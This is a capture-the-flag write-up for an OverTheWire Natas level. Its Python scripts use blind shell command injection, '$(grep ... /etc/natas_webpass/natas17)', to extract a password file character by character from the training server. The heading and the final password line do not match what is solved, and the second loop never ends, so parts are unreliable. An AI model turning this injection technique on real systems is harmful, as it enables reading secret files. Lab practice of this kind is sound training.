# [Level 15 to 16](https://overthewire.org/wargames/natas/natas16.html)

- Login
```
URL: http://natas16.natas.labs.overthewire.org
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
- Exercise:
  - ![image](https://github.com/user-attachments/assets/b87d0948-ffda-4d57-b1f9-bc112973b631)
  - ![image](https://github.com/user-attachments/assets/fcbd0cdd-2a78-44c0-9c66-95add35b1b62)
- Background:
- Solution:
  - python script to find valid characters:
  ```python
  import requests
  import string
  from requests.auth import HTTPBasicAuth
  
  basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
  
  u="http://natas16.natas.labs.overthewire.org/"
  
  VALID_CHARS = string.digits + string.ascii_letters
  
  matchingChars = ""
  
  for c in VALID_CHARS:
      payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
      url = u + "?needle=" + payload + "&submit=Search"
  
      response = requests.get(url, auth=basicAuth, verify=False)
  
      if 'zigzag' not in response.text:
          print("Found a valid char : %s" % c)
          matchingChars += c
  
  print("Matching chars: ", matchingChars)
  ```
  - Output:
  ```bash
  Found a valid char : 0
  Found a valid char : 5
  Found a valid char : 7
  Found a valid char : 8
  Found a valid char : 9
  Found a valid char : b
  Found a valid char : h
  Found a valid char : j
  Found a valid char : k
  Found a valid char : o
  Found a valid char : q
  Found a valid char : s
  Found a valid char : v
  Found a valid char : w
  Found a valid char : C
  Found a valid char : E
  Found a valid char : F
  Found a valid char : H
  Found a valid char : J
  Found a valid char : L
  Found a valid char : N
  Found a valid char : O
  Found a valid char : T
  Matching chars:  05789bhjkoqsvwCEFHJLNOT
  ```
  - python script to iterate through the matching chars:
  ```python
  import requests
  import string
  from requests.auth import HTTPBasicAuth
  
  basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
  u="http://natas16.natas.labs.overthewire.org/"
  
  PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
  matchingChars = "05789bhjkoqsvwCEFHJLNOT"
  password="" # start with blank password
  
  while True:
      for c in matchingChars:
          payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
  
          url = u + "?needle=" + payload + "&submit=Search"
  
          print(url)
  
          response = requests.get(url, auth=basicAuth, verify=False)
  
          if 'zigzag' not in response.text:
              print("Found a valid char : %s" % (password+c))
              password += c
  ```
- Password: `hPkjKYviLQctEW33QmuXL6eDVfMW4sGo`
